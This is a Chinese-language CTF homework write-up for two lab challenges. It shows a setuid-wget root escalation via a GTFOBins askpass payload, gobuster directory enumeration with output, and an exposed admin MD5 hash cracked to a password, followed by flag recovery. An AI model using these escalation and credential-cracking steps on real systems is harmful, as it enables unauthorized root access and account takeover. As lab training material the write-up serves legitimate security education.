

---

# SCIST Linux CTF Writeup
---
作業的第一題 **writeup**
### 1: 使用 Netcat 連線

連線到目標伺服器：

```bash
nc 140.116.246.59 30001
```

###  2: 找的 `wget` 設定

到處亂翻找到wget有setuid,那麼可以去https://gtfobins.github.io/gtfobins/
找能用的資源
wget那欄有提權的指令

###  3: 執行提權指令

用GTFOBins 提供的指令進行提權：

```bash
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh -p \n/bin/sh -p 1>&0' >$TF
wget --use-askpass=$TF 0
```

此操作將會獲得提權的 shell。

###  4: 返回根目錄並檢視 flag

提權成功後，返回根目錄cat `flag.txt` 文件內容：

```bash
cd /
cat flag.txt
```


 **flag**：

```
flag{w93t_1s_p0weRfU1_6i3b3EcNUnJhbkrN}
```

---

### 注意事項

提權成功後不要亂改，垃圾才會這樣。

--- 




作業的第二題 **writeup**

---

###  1: 安裝 gobuster
首先確定有安裝 **gobuster** 工具，如果沒安裝，可以用這個指令來安裝：

```bash
sudo apt install gobuster
```

###  2: 使用 gobuster 進行目錄掃描

輸入指令來對目標 URL 進行目錄枚舉：

```bash
gobuster dir -u http://140.116.246.59:30002 -w /usr/share/wordlists/dirb/common.txt
```

這裡用 `/usr/share/wordlists/dirb/common.txt` 作為字典檔。：

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://140.116.246.59:30002
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/_data                (Status: 200) [Size: 346]
/_database            (Status: 200) [Size: 393]
/login                (Status: 200) [Size: 594]
/Login                (Status: 200) [Size: 594]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

###  3: 找目錄內容

根據掃描結果，我們找到了以下幾個有效的目錄：

- `http://140.116.246.59:30002/_data`
- `http://140.116.246.59:30002/_database`
- `http://140.116.246.59:30002/_login`
- `http://140.116.246.59:30002/_Login`

#### 進入 `_data`

打開 `http://140.116.246.59:30002/_data`，會寫：

```
Congratulations!
}bbbbbbbb_rrrrrrrr :galf eht fo trap dnoces eht dnuof ev'uoY
```

將字串反向，可以得到：

```
You've found the second trap of the flag: rrrrrrr_bbbbbbbb
```

這表示 **flag** 的第二部分為：`rrrrrrr_bbbbbbbb`

#### 進入 `_database`

接著進去 `http://140.116.246.59:30002/_database`，會寫：

```json
{
  "users": [
    {
      "username": "admin",
      "password": "cf9ee5bcb36b4936dd7064ee9b2f139e"
    }
  ]
}
```

密碼欄應該是 **MD5** ，破解後得到密碼：`naruto`

#### 登入 `/login`

前往 `http://140.116.246.59:30002/_login`，並填入帳號：`admin`，密碼：`naruto`。登入後顯示如下內容：

```
_iiiiiii_ddddddd{galf :galf eht fo trap tsrif eht dnuof ev'uoY
```

將字串反向得到：

```
You've found the first trap of the flag: {flag ddddddd_iiiiiii
```

這表示 **flag** 的第一部分為：`{flag ddddddd_iiiiiii`

### 4: 合併結果

將兩部分合併，並在中間加上底線，即可得到完整的 **flag**：

```
flag{ddddddd_iiiiiii_rrrrrrrr_bbbbbbbb}
```

---

### 最後

此 **writeup** 我有讓gpt幫我寫hackmd的版本,原版太醜了
